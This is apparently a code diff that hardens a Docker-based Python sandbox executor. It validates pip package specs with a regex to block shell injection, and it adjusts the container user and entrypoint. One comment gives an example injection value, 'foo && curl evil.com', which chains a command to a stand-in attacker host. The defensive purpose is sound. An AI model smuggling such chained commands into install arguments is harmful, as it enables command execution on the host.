@@ -38,12 +38,17 @@ Package Installation Note:
 import subprocess
 import tempfile
 import os
+import re
 import time
 import logging
 from dataclasses import dataclass
 from typing import Optional
 
 logger = logging.getLogger(__name__)
+
+# Regex for valid pip package specs: name with optional version constraints and extras
+# e.g. "pandas", "numpy>=1.21", "requests[security]==2.31.0", "scikit-learn"
+_SAFE_PACKAGE_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?(\[[a-zA-Z0-9,._-]+\])?(([><=!~]=?|===?)[a-zA-Z0-9.*]+)?$')
 
 
 @dataclass
@@ -131,7 +136,7 @@ class DockerExecutor:
                 "--user", "1000:1000",
                 "-v", f"{tmp_path}:/sandbox/script.py:ro",
                 self.IMAGE_NAME,
-                "python3", "/sandbox/script.py"
+                "/sandbox/script.py"    # ENTRYPOINT ["python3"] in Dockerfile provides interpreter
             ]
 
             logger.info(f"Executing in container (timeout={self.timeout}s)")
@@ -199,13 +204,46 @@ class DockerExecutor:
         if not packages:
             return self.execute(code)
 
+        # ── Defence-in-depth: validate package names before interpolating
+        #    into a Dockerfile RUN command.  Prevents shell injection via
+        #    crafted package specs like "foo && curl evil.com".
+        sanitized_packages = []
+        for pkg in packages:
+            pkg = str(pkg).strip()
+            if not pkg:
+                continue
+            if not _SAFE_PACKAGE_RE.match(pkg):
+                logger.warning(
+                    "Rejected unsafe package spec (possible injection): %s", pkg
+                )
+                return ExecutionResult(
+                    return_code=1,
+                    stdout="",
+                    stderr=(
+                        f"PackageInstallError: Rejected unsafe package spec: "
+                        f"'{pkg}'. Only alphanumeric names with version "
+                        f"specifiers are allowed."
+                    ),
+                    execution_time=0.0,
+                    timed_out=False,
+                    error_type="PackageInstallError"
+                )
+            sanitized_packages.append(pkg)
+
+        if not sanitized_packages:
+            return self.execute(code)
+
         tmp_image = f"{self.IMAGE_NAME}-pkgs-{int(time.time())}"
 
         # --- Step 1: install packages into a temporary image layer ---
-        pip_args = " ".join(packages)
+        pip_args = " ".join(sanitized_packages)
+        # Switch to root for pip install: base image runs as USER agent (no home dir),
+        # so without USER root pip tries user-install and fails with Permission denied.
         dockerfile_content = (
             f"FROM {self.IMAGE_NAME}\n"
+            f"USER root\n"
             f"RUN pip install --no-cache-dir {pip_args}\n"
+            f"USER agent\n"
         )
 
         with tempfile.TemporaryDirectory() as build_dir:
@@ -215,7 +253,7 @@ class DockerExecutor:
 
             build_result = subprocess.run(
                 ["docker", "build", "-t", tmp_image, build_dir],
-                capture_output=True, text=True, timeout=300
+                capture_output=True, encoding='utf-8', errors='replace', timeout=300
             )
 
         if build_result.returncode != 0:
@@ -258,7 +296,7 @@ class DockerExecutor:
                 "--user", "1000:1000",
                 "-v", f"{tmp_path}:/sandbox/script.py:ro",
                 tmp_image,
-                "python3", "/sandbox/script.py"
+                "/sandbox/script.py"    # ENTRYPOINT ["python3"] in Dockerfile provides interpreter
             ]
 
             result = subprocess.run(
